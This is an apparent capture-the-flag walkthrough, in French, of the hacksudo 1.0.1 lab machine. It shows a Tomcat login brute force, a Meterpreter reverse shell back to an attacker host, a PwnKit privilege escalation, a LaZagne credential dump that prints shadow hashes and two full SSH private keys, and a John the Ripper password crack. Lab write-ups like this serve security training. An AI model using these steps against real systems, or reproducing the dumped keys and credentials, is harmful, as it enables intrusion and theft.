# hacksudo 1.0.1

1.Énumération

**<span style="color: #dddddd;">👁️</span> Massap**

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $sudo sh massap.sh

   *                                
 (  `                               
 )\))(      )             )         
((_)()\  ( /(  (   (   ( /(  `  )   
(_()((_) )(_)) )\  )\  )(_)) /(/(   
|  \/  |((_)_ ((_)((_)((_)_ ((_)_\  
| |\/| |/ _` |(_-<(_-</ _` || '_ \) 
|_|  |_|\__,_|/__//__/\__,_|| .__/  
                            |_|     

by M0rPH3U53
      
[i] Scan IP: 192.168.56.205
[i] Rate: 1000
 
[+] Scan Masscan 192.168.56.205...100%
[+] Scan Nmap 192.168.56.205...100%
 
[+] 2222/tcp open
[+] 8080/tcp open
[+] 80/tcp open
 
==========================================================
|                         Rapports                       |
==========================================================
| Nmap:/home/m0rph3u5/Massap/192.168.56.205-tcp.html     |
==========================================================
```

&nbsp;

**<span style="color: #dddddd;">💥</span> Metasploit - tomcat_mgr_login**

Brute force mot de passe du tomcat

```
[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> run
[+] 192.168.56.205:8080 - Login Successful: admin:admin
[+] 192.168.56.205:8080 - Login Successful: tomcat:tomcat
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed 
```

&nbsp;

**<span style="color: #dddddd;">💥</span> Metasploit - Webshell**

Exécution de la webshell

```
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
[*] Started reverse TCP handler on 192.168.56.149:4444 
[*] Sending stage (58073 bytes) to 192.168.56.205
[*] Meterpreter session 1 opened (192.168.56.149:4444 -> 192.168.56.205:37232) at 2025-04-19 10:48:49 +0200

(Meterpreter 1)(/) >
```

&nbsp;

**<span style="color: #dddddd;">🤖</span> Linpeas**

Élévation de privilege avec linpeas

```
tomcat@hacksudo:/tmp$ ./linpeas.sh

╔══════════╣ Executing Linux Exploit Suggester
╚
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

```

&nbsp;

**<span style="color: #dddddd;">💀</span> Pwnkit**

Élévation de privilège

```
tomcat@hacksudo:/tmp$ ./PwnKit
./PwnKit
root@hacksudo:/tmp# 
```

&nbsp;

**<span style="color: #dddddd;">👾</span> Lazagne**

Cherchons des mot de passe sur la machine

```
root@hacksudo:/tmp/LaZagne-2.4.6/Linux# python3 laZagne.py all
python3 laZagne.py all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Shadow passwords -----------------

[+] Hash found !!!
Login: root
Hash: $6$FnNyu0TgRIZ6dYuN$KNq2mL2kZCmeCWExldSgRQ3FZIJybgP4Z4jxK0mf6MjtIjHFt4wg2V.zacA5AwGBl6o4ScK/49GHVhg7jWDsn/:18716:0:99999:7:::

[+] Hash found !!!
Login: vishal
Hash: $6$8T31y0GgO0brhBcT$wl5DWmbQQMkDBkjgPni/jezvt7CaoUrInBt5r.WwKp01hoSEJfNEXlm4lFsOxHLiiBvH4otj1NBEsjcegERNu/:18650:0:99999:7:::

[+] Hash found !!!
Login: hacksudo
Hash: $6$BbHLmcwsOUthw0GQ$7.BiVR.qQJl15UnkBlafZlan/zu6eMWcKjwUqs2m50zao6I4rRLEQZzmdpXAbpJ84eZjaQ2yFfVbFKIYWrzyJ0:18716:0:99999:7:::

[+] Hash found !!!
Login: systemd-coredump
Hash: !*:18649::::::

------------------- Ssh passwords -----------------

KEY: -----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

User: root

KEY: -----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

User: vishal


[+] 6 passwords have been found.
For more information launch it again with the -v option

elapsed time = 0.2062218189239502

```

&nbsp;

**<span style="color: #dddddd;">🧨</span> JohnTheRipper**

Crack du mot de passe

```
┌─[m0rph3u5@parrot]─[~]
└──╼ $john hacksudo-hash 
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
hacker           (vishal)     

```

&nbsp;

Identifiant trouver

| Users | Passwords |
| --- | --- |
| vishal | hacker |
